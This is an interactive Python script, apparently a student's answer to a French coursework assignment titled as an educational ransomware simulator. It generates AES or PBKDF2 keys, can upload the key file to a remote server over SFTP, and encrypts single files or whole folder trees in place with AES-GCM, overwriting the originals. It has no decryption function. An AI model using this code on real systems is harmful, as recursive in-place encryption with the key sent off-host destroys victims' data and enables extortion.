#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
TD-03: Ransomware (Simulateur éducatif)
Objectif: Gestion de clés et chiffrement de fichiers.
"""

import os
import sys
import subprocess
import json
import base64
import getpass
import datetime
from pathlib import Path

# --- PARTIE A: Vérification des dépendances [cite: 50] ---
def check_dependencies():
    """Vérifie et installe les dépendances nécessaires."""
    print(" [*] Vérification de l'environnement...")
    
    # Vérification Python 3.8+ [cite: 51]
    if sys.version_info < (3, 8):
        print(" [!] Erreur: Python 3.8+ est requis.")
        sys.exit(1)

    required_packages = {
        "cryptography": "cryptography",
        "paramiko": "paramiko",
        "tqdm": "tqdm"  # Pour la barre de progression
    }
    
    missing = []
    for import_name, package_name in required_packages.items():
        try:
            __import__(import_name)
        except ImportError:
            missing.append(package_name)
    
    if missing:
        print(f" [!] Paquets manquants : {', '.join(missing)}")
        choice = input(" [?] Voulez-vous les installer maintenant ? (O/N) : ").strip().lower()
        if choice == 'o':
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
                print(" [v] Installation réussie.")
                # On redémarre le script pour prendre en compte les imports
                print(" [*] Veuillez relancer le script.")
                sys.exit(0)
            except subprocess.CalledProcessError:
                print(" [x] Erreur lors de l'installation automatique.")
                sys.exit(1)
        else:
            print(" [x] Impossible de continuer sans les dépendances.")
            sys.exit(1)
    else:
        print(" [v] Toutes les dépendances sont satisfaites.")

# Importation après vérification
try:
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.backends import default_backend
    import paramiko
    from tqdm import tqdm
except ImportError:
    pass # Géré par check_dependencies

# --- Configuration Globale ---
KEY_STORAGE_PATH = "/var/keys/"
if sys.platform == "win32":
    KEY_STORAGE_PATH = "C:\\Temp\\keys\\" # Adaptation Windows

# --- PARTIE C: Génération de Clés [cite: 59] ---
def generate_key():
    """Génère une clé de chiffrement (AES ou PBKDF2)."""
    print("\n--- Génération de Clé ---")
    
    # Choix de l'algorithme [cite: 61]
    print(" 1. AES (Aléatoire)")
    print(" 2. PBKDF2 (Dérivé d'un mot de passe)")
    algo_choice = input(" Choix (1/2) : ")
    
    # Choix de la longueur [cite: 60]
    length = 0
    while length not in [128, 192, 256]:
        try:
            length = int(input(" Longueur de la clé (128, 192, 256) : "))
        except ValueError:
            pass
    
    key_bytes = b""
    metadata = {}
    
    if algo_choice == '1': # AES Random
        # Conversion bits -> bytes (ex: 256 bits = 32 bytes)
        key_bytes = os.urandom(length // 8)
        metadata = {"algo": "AES", "length": length, "type": "random"}
        
    elif algo_choice == '2': # PBKDF2
        password = getpass.getpass(" Mot de passe pour la dérivation : ")
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=length // 8,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        key_bytes = kdf.derive(password.encode())
        metadata = {
            "algo": "PBKDF2", 
            "length": length, 
            "salt": base64.b64encode(salt).decode('utf-8'),
            "iterations": 100000
        }
    
    else:
        print(" [x] Choix invalide.")
        return None

    return key_bytes, metadata

def save_key(key_bytes, metadata):
    """Sauvegarde la clé localement dans un fichier JSON[cite: 94]."""
    if not key_bytes:
        return

    # Création du dossier si inexistant
    if not os.path.exists(KEY_STORAGE_PATH):
        try:
            os.makedirs(KEY_STORAGE_PATH)
        except OSError as e:
            print(f" [x] Erreur création dossier clés: {e}")
            return

    # Nom du fichier avec timestamp
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"key_{metadata['algo']}_{metadata['length']}_{timestamp}.json"
    filepath = os.path.join(KEY_STORAGE_PATH, filename)
    
    # Préparation des données (la clé binaire est encodée en base64 pour le JSON)
    data = {
        "key_b64": base64.b64encode(key_bytes).decode('utf-8'),
        "metadata": metadata,
        "created_at": str(datetime.datetime.now())
    }
    
    try:
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=4)
        
        # Permissions restreintes (Linux uniquement) [cite: 62]
        if sys.platform != "win32":
            os.chmod(filepath, 0o600)
            
        print(f" [v] Clé sauvegardée : {filepath}")
        return filepath
    except Exception as e:
        print(f" [x] Erreur sauvegarde: {e}")
        return None

# --- PARTIE D: Transfert SFTP [cite: 63] ---
def send_sftp(local_file):
    """Envoie le fichier de clé vers un serveur distant."""
    if not local_file:
        print(" [!] Aucune clé à envoyer.")
        return

    print("\n--- Transfert SFTP ---")
    host = input(" Serveur (IP/Hôte) : ")
    user = input(" Utilisateur : ")
    pwd = getpass.getpass(" Mot de passe : ")
    port = input(" Port (défaut 22) : ")
    port = int(port) if port.isdigit() else 22
    remote_path = input(f" Dossier destination (ex: /tmp/) : ")

    try:
        # Connexion sécurisée [cite: 65]
        transport = paramiko.Transport((host, port))
        transport.connect(username=user, password=pwd)
        sftp = paramiko.SFTPClient.from_transport(transport)
        
        filename = os.path.basename(local_file)
        dest_path = os.path.join(remote_path, filename).replace("\\", "/") # Fix chemins
        
        print(f" [*] Envoi de {filename} vers {host}...")
        sftp.put(local_file, dest_path) # Transfert [cite: 66]
        
        print(" [v] Transfert réussi !")
        sftp.close()
        transport.close()
    except Exception as e:
        print(f" [x] Erreur SFTP: {e}") # Gestion erreurs [cite: 68]

# --- PARTIE E & F: Chiffrement [cite: 69] ---
def encrypt_file(filepath, key_bytes, inplace=True):
    """Chiffre un fichier unique (AES-GCM)."""
    try:
        # AES-GCM nécessite un nonce (IV)
        aesgcm = AESGCM(key_bytes)
        nonce = os.urandom(12)
        
        with open(filepath, 'rb') as f:
            data = f.read()
            
        # Chiffrement
        encrypted_data = aesgcm.encrypt(nonce, data, None)
        
        # In-place: on écrase le fichier ou on crée un .enc
        target_path = filepath if inplace else filepath + ".enc"
        
        with open(target_path, 'wb') as f:
            f.write(nonce + encrypted_data) # On stocke le nonce au début
            
        if not inplace:
            print(f" -> Créé : {target_path}")
    except Exception as e:
        print(f" [x] Erreur chiffrement {filepath}: {e}")
        return False
    return True

def select_and_encrypt(current_key):
    """Menu de sélection des fichiers/dossiers à chiffrer."""
    if not current_key:
        print(" [!] Veuillez d'abord générer ou charger une clé.")
        return

    print("\n--- Menu Chiffrement ---")
    print(" 1. Fichier unique")
    print(" 2. Dossier complet (Récursif)")
    choice = input(" Choix : ")
    
    # Clé AES-GCM doit être convertie si elle n'est pas 128/192/256 bits valides
    # Ici on suppose que generate_key a fait le travail correctement.
    # Note: AESGCM accepte 128, 192, 256 bits.
    
    targets = []
    
    if choice == '1': # [cite: 70]
        path = input(" Chemin du fichier : ")
        if os.path.isfile(path):
            targets.append(path)
        else:
            print(" [!] Fichier introuvable.")
            
    elif choice == '2': # [cite: 71]
        path = input(" Chemin du dossier : ")
        if os.path.isdir(path):
            print(" [*] Analyse des fichiers...")
            for root, dirs, files in os.walk(path): # Récursif [cite: 74]
                for file in files:
                    targets.append(os.path.join(root, file))
        else:
            print(" [!] Dossier introuvable.")
    
    if not targets:
        return

    confirm = input(f" [?] Chiffrer {len(targets)} fichiers IN-PLACE ? (O/N) : ").lower() # [cite: 72]
    if confirm == 'o':
        # Barre de progression [cite: 75]
        for filepath in tqdm(targets, desc="Chiffrement en cours", unit="file"):
            encrypt_file(filepath, current_key, inplace=True)
        print(" [v] Opération terminée.")
    else:
        print(" [!] Opération annulée.")

# --- PARTIE B: Menu Principal [cite: 54] ---
def main():
    check_dependencies() # 
    
    current_key_bytes = None
    last_key_file = None

    while True:
        print("\n=== Système de Chiffrement - TP3 ===")
        print(f"Clé active : {'OUI' if current_key_bytes else 'NON'}")
        print(" 1. Générer une nouvelle clé") # [cite: 107]
        print(" 2. Envoyer la dernière clé via SFTP") # [cite: 108]
        print(" 3. Chiffrer des fichiers/dossiers") # [cite: 109]
        print(" 4. Quitter")
        
        choice = input(" Choix : ")
        
        if choice == '1':
            key_data = generate_key() # [cite: 93]
            if key_data:
                current_key_bytes, metadata = key_data
                last_key_file = save_key(current_key_bytes, metadata) # [cite: 94]
                
        elif choice == '2':
            if last_key_file:
                send_sftp(last_key_file) # [cite: 95]
            else:
                path = input(" Chemin manuel vers le fichier clé : ")
                if os.path.exists(path):
                    send_sftp(path)
                else:
                    print(" [!] Fichier introuvable.")
                    
        elif choice == '3':
            select_and_encrypt(current_key_bytes) # [cite: 96], [cite: 97]
            
        elif choice == '4':
            print(" Au revoir.")
            break
        else:
            print(" Choix invalide.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n [!] Interruption utilisateur.")
        sys.exit(0)